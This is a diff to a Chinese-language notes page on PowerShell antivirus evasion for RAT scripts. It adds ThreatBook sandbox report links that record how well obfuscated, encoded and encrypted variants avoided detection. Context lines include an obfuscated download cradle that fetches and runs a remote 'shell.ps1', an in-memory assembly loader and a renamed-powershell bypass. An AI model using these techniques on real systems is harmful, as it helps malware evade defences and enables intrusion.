@@ -122,6 +122,10 @@ $client.Close();
 
 > 360 的离线查杀似乎不太好用
 
+[样本报告-微步在线云沙箱 (threatbook.com)](https://s.threatbook.com/report/file/f403aea15df24095b3270a5572191f77a02664b7b0792e8f2d229a5a4895a1b5)
+
+![image-20240115174529326](http://cdn.ayusummer233.top/DailyNotes/202401151745427.png)
+
 
 ---
 
@@ -222,6 +226,12 @@ $obfuscatedScript | Out-File -FilePath "Obfuscated_RAT.ps1"
 
 ![image-20240102024318383](http://cdn.ayusummer233.top/DailyNotes/202401020243445.png)
 
+---
+
+[样本报告-微步在线云沙箱 (threatbook.com)](https://s.threatbook.com/report/file/7b59dc64c8410f955e918f886ebcc066ce2eddeb76737b893e82988c83c34307)
+
+![image-20240115174645870](http://cdn.ayusummer233.top/DailyNotes/202401151746203.png)
+
 
 ---
 
@@ -261,6 +271,10 @@ $decodedExecuteScript | Out-File -FilePath "EncodedRAT.ps1"
 
 ![image-20240102031520703](http://cdn.ayusummer233.top/DailyNotes/202401020315790.png)
 
+[样本报告-微步在线云沙箱 (threatbook.com)](https://s.threatbook.com/report/file/e1910e688ccdce21396cfc2d44012ac4520dc6c6a2508c8dd14948e3e0411ac0)
+
+![image-20240115180448559](http://cdn.ayusummer233.top/DailyNotes/202401151804395.png)
+
 ---
 
 ##### 自定义加密
@@ -293,6 +307,12 @@ $decryptionScript | Out-File -FilePath "EncryptedRAT.ps1"
 
 ---
 
+[样本报告-微步在线云沙箱 (threatbook.com)](https://s.threatbook.com/report/file/4673839b2e1403c7c1cad50913517f3e9e7d3e4491da36cebac882051a0ba749)
+
+![image-20240115181202403](http://cdn.ayusummer233.top/DailyNotes/202401151812539.png)
+
+---
+
 #### 填充合法的系统命令
 
 和填充脏数据差不多的意思, 通过填充大量合法指令来混淆视听, 例如
@@ -315,6 +335,14 @@ $obfuscatedScript -join "`n" | Out-File -FilePath "ObfuscatedRAT.ps1"
 ![image-20240102041117645](http://cdn.ayusummer233.top/DailyNotes/202401020411712.png)
 
 ![image-20240102040837354](http://cdn.ayusummer233.top/DailyNotes/202401020408407.png)
+
+---
+
+[样本报告-微步在线云沙箱 (threatbook.com)](https://s.threatbook.com/report/file/09a7291d125fc95428ce138099d84806702e6d77c8e8e2e4fa429769adcb8893)
+
+微步标了个可疑
+
+![image-20240115181311714](http://cdn.ayusummer233.top/DailyNotes/202401151813457.png)
 
 ---
 
@@ -474,7 +502,11 @@ Invoke-Expression `$decryptedScript
 $decryptionScript | Out-File -FilePath "EncryptedRAT.ps1"
 ```
 
+[样本报告-微步在线云沙箱 (threatbook.com)](https://s.threatbook.com/report/file/da54f8b59c4643f2248c77d1263b98ef036fe7fa9946b0d05b22bbdc72dfc98f)
 
+微步是无检出的
+
+![image-20240115181538678](http://cdn.ayusummer233.top/DailyNotes/202401151815161.png)
 
 ---
 
@@ -512,10 +544,6 @@ $decryptionScript | Out-File -FilePath "ConditionTriggeredEncryptedRAT.ps1"
 
 ```
 
-
-
-
-
 ---
 
 ### 行为免杀
@@ -526,9 +554,7 @@ $decryptionScript | Out-File -FilePath "ConditionTriggeredEncryptedRAT.ps1"
 powershell -NoExit "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://xx.x.x/shell.ps1'')'.Replace('123','adString');IEX ($c1+$c2)"
 ```
 
-
-
-
+> 没感觉到具体用处, 放个 TODO
 
 ---
 
@@ -547,10 +573,6 @@ $asm.EntryPoint.Invoke($null,@());
     - `$null`：表示Invoke方法被调用的对象。因为大多数.NET程序的入口点Main方法是静态的（即它不依赖于类的实例），所以这里使用$null。如果入口点是一个实例方法（非静态），这里将需要一个该类的实例。
     - `@()`：传递给Main方法的参数数组。在这个例子中，使用空数组@()，表示没有参数被传递。如果Main方法期望参数，它们将在这里提供。
 
-
-
-
-
 ---
 
 ### 拷贝重命名 powershell
@@ -562,11 +584,7 @@ copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe bypass.txt
 bypass.txt IEX(xxx)
 ```
 
-
-
-
-
-
+> 现在基本上没什么用了
 
 ---
 
